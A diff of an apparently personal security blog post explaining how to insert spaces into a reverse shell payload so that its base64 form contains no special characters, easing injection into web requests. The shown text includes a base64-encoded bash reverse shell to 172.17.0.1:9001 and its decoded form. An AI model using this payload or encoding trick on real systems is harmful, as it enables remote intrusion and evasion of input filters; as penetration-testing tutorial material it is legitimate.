@@ -5,12 +5,12 @@ draft = false
 +++
 
 # Description of the Problem
-when trying a reverse shell payload, you want to remove as many variables as possible.
-often it must be injected in the middle of a series of broken quotes or special characters.
-it would be beneficial to remove as many special characters as possible.
+When trying a reverse shell payload, you want to remove as many variables as possible.
+Often it must be injected in the middle of a series of broken quotes or special characters.
+It would be beneficial to remove as many special characters as possible.
 
-base64 consists of an alphabet of uppercase, lowercase, numbers, and special symbols like plus signs.
-these speical characters have meaning in web payloads, where form encoding or json special characters may mean you have to alter your payload to work properly in the context where you paste it.
+Base64 consists of an alphabet of uppercase, lowercase, numbers, and special symbols like plus signs.
+These speical characters have meaning in web payloads, where form encoding or json special characters may mean you have to alter your payload to work properly in the context where you paste it.
 
 - example reverse shell payload for testing in a docker that generates plus signs in its base64
 ```bash
@@ -34,10 +34,10 @@ echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS85MDAxICAwPiYx|base64 -d
 bash -i  >& /dev/tcp/172.17.0.1/9001  0>&1
 ```
 As you can see, spaces have been inserted in two locations in order to move the characters around to specific locations.
+How can this easily be done?
 
 ## The Algorithm
 
-How can this be done?
 The easiest algorithm to implement is to just start trying all possibilities of spaces inserted until one converts to alphanumeric base64.
 I have [implemented such an algorithm in bash and awk](https://github.com/nicholas-long/environment/blob/main/zet/20230906035744/README.md).
 I use this script within the [shortcut command in my environment for creating reverse shell snippets](https://github.com/nicholas-long/environment/blob/main/zet/20230906035650/README.md)
